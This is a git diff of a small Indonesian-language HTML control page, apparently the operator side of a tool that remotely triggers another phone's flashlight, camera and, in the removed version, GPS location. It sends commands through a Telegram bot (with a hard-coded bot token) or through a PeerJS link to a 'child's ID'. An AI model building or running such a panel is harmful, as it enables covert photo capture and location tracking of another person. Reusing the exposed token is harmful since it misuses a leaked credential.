@@ -1,47 +1,28 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>HAYABUSA REMOTE CENTER</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body { background: #0d1117; color: #58a6ff; text-align: center; font-family: sans-serif; padding: 20px; }
-        .card { border: 1px solid #30363d; border-radius: 12px; margin-bottom: 20px; padding: 15px; background: #161b22; }
-        button { padding: 15px; width: 100%; margin-top: 10px; border-radius: 8px; border: 1px solid #30363d; background: #21262d; color: #fff; font-weight: bold; }
-        .on { background: #238636; } .off { background: #da3633; }
-    </style>
-</head>
-<body>
-    <h2>🚀 REMOTE COMMAND</h2>
-    
-    <div class="card">
-        <h3>🔦 Kontrol Hardware</h3>
-        <button class="on" onclick="sendCmd('torch_on')">NYALAKAN SENTER</button>
-        <button class="off" onclick="sendCmd('torch_off')">MATIKAN SENTER</button>
-    </div>
+<head><title>REMOTE DIRECT</title></head>
+<body style="background:#111; color:#fff; text-align:center;">
+    <h2>🎮 DIRECT REMOTE</h2>
+    <input type="text" id="target-id" placeholder="Masukkan ID Anak">
+    <button onclick="konekin()">HUBUNGKAN</button>
+    <hr>
+    <button onclick="kirim('senter_on')">SENTER ON</button>
+    <button onclick="kirim('senter_off')">SENTER OFF</button>
+    <button onclick="kirim('foto')">AMBIL FOTO</button>
 
-    <div class="card">
-        <h3>📸 Monitoring</h3>
-        <button onclick="sendCmd('camera')">AMBIL FOTO SEKARANG</button>
-        <button onclick="sendCmd('location')">CEK LOKASI GPS</button>
-    </div>
-
-    <div class="card" style="opacity: 0.5;">
-        <h3>💬 App Control (Butuh Termux)</h3>
-        <p style="font-size: 10px;">Fitur Buka WA/FB dilarang oleh Browser.</p>
-        <button disabled>BUKA WHATSAPP</button>
-    </div>
-
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <script>
-        const TOKEN = "8373626378:AAHmCRe_FCCDug1yrlsnat6WFhi71Qf6lQI";
-        const ID = "7596509818";
+        const peer = new Peer();
+        let koneksi;
 
-        function sendCmd(cmd) {
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: ID, text: `!exec ${cmd}` })
-            });
-            alert("Perintah dikirim: " + cmd);
+        function konekin() {
+            const id = document.getElementById('target-id').value;
+            koneksi = peer.connect(id);
+            alert("Mencoba menyambungkan...");
+        }
+
+        function kirim(cmd) {
+            if(koneksi) koneksi.send(cmd);
         }
     </script>
 </body>
